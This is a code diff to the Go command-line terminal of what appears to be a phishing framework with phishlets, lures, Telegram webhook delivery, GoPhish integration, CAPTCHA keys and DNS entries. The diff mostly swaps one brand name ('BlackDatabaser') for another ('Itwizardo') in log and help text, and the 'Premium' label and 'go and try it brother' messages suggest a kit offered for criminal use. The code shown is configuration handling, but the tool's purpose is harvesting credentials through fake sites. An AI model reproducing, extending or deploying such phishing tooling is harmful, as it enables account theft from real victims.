@@ -199,7 +199,6 @@ func (t *Terminal) handleConfig(args []string) error {
 	} else if pn == 2 {
 		switch args[0] {
 
-
 		case "turnstile_sitekey":
 			t.cfg.SetTurnstileSitekey(args[1])
 			return nil
@@ -213,7 +212,6 @@ func (t *Terminal) handleConfig(args []string) error {
 			t.cfg.SetReCaptchaPrivkey(args[1])
 			return nil
 
-
 		case "domain":
 			t.cfg.SetBaseDomain(args[1])
 			t.cfg.ResetAllSites()
@@ -221,7 +219,7 @@ func (t *Terminal) handleConfig(args []string) error {
 			return nil
 		case "webhook_telegram":
 			t.cfg.SetWebhookTelegram(args[1])
-			log.Warning("Brother now restart this amazing tool by BlackDatabaser and use it")
+			log.Warning("Restart this tool and use it")
 			return nil
 
 		case "ipv4":
@@ -253,9 +251,9 @@ func (t *Terminal) handleConfig(args []string) error {
 				t.p.gophish.Setup(t.cfg.GetGoPhishAdminUrl(), t.cfg.GetGoPhishApiKey(), t.cfg.GetGoPhishInsecureTLS())
 				err := t.p.gophish.Test()
 				if err != nil {
-					log.Error("BlackDatabaser: %s", err)
+					log.Error("Itwizardo: %s", err)
 				} else {
-					log.Success("BlackDatabaser: connection was successful go and try it brother !")
+					log.Success("Itwizardo: connection was successful go and try it brother !")
 				}
 				return nil
 			}
@@ -291,15 +289,12 @@ func (t *Terminal) handleConfig(args []string) error {
 			}
 		}
 
-
 	} else if pn == 4 {
 		switch args[0] {
 		case "dnsentry":
 			t.cfg.SetDnsEntry(args[1], args[2], args[3])
 			return nil
 		}
-
-
 
 	}
 	return fmt.Errorf("invalid syntax: %s", args)
@@ -996,12 +991,6 @@ func (t *Terminal) handleLures(args []string) error {
 					do_update = true
 					log.Info("redirect_url = '%s'", l.RedirectUrl)
 
-
-
-
-
-
-
 				case "phishlet":
 					_, err := t.cfg.GetPhishlet(val)
 					if err != nil {
@@ -1198,11 +1187,11 @@ func (t *Terminal) monitorLurePause() {
 
 func (t *Terminal) createHelp() {
 	h, _ := NewHelp()
-	h.AddCommand("config", "general", "manage general configuration", "Shows values of all BlackDatabaser configuration variables and allows to change them.", LAYER_TOP,
+	h.AddCommand("config", "general", "manage general configuration", "Shows values of all Itwizardo configuration variables and allows to change them.", LAYER_TOP,
 		readline.PcItem("config", readline.PcItem("domain"), readline.PcItem("ipv4", readline.PcItem("external"), readline.PcItem("bind")), readline.PcItem("unauth_url"), readline.PcItem("autocert", readline.PcItem("on"), readline.PcItem("off")),
 			readline.PcItem("gophish", readline.PcItem("admin_url"), readline.PcItem("api_key"), readline.PcItem("insecure", readline.PcItem("true"), readline.PcItem("false")), readline.PcItem("test")), readline.PcItem("dnsentry")))
 	h.AddSubCommand("config", nil, "", "show all configuration variables")
-	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. BlackDatabaser.com)")
+	h.AddSubCommand("config", []string{"domain"}, "domain <domain>", "set base domain for all phishlets (e.g. example.com)")
 	h.AddSubCommand("config", []string{"ipv4"}, "ipv4 <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"ipv4", "external"}, "ipv4 external <ipv4_address>", "set ipv4 external address of the current server")
 	h.AddSubCommand("config", []string{"webhook_telegram"}, "webhook_telegram <bot_token>/<chat_id>", "format: bot_token/chat_id (example: 9165432191:ABBJvavhVAcaqTCXAvh4wGxxxxxxxxx/-17751242916)")
@@ -1213,7 +1202,7 @@ func (t *Terminal) createHelp() {
 	h.AddSubCommand("config", []string{"gophish", "api_key"}, "gophish api_key <key>", "set up the api key for the gophish instance to communicate with")
 	h.AddSubCommand("config", []string{"gophish", "insecure"}, "gophish insecure <true|false>", "enable or disable the verification of gophish tls certificate (set to `true` if using self-signed certificate)")
 	h.AddSubCommand("config", []string{"gophish", "test"}, "gophish test", "test the gophish configuration")
-	h.AddSubCommand("config", []string{"dnsentry"}, "BlackDatabaser Premium dnsentry <name> <record_type> <value>", "provide a DNS entry of type A or CNAME to be returned by the internal resolver e.g. 'www CNAME cloudfront.net.'")
+	h.AddSubCommand("config", []string{"dnsentry"}, "Itwizardo Premium dnsentry <name> <record_type> <value>", "provide a DNS entry of type A or CNAME to be returned by the internal resolver e.g. 'www CNAME cloudfront.net.'")
 	h.AddSubCommand("config", []string{"turnstile_sitekey"}, "turnstile_sitekey", "change the site key for Cloudflare's Turnstile CAPTCHA")
 	h.AddSubCommand("config", []string{"turnstile_privkey"}, "turnstile_privkey", "change the private key for Cloudflare's Turnstile CAPTCHA")
 	h.AddSubCommand("config", []string{"recaptcha_sitekey"}, "recaptcha_sitekey", "change the site key for Google's reCAPTCHA")
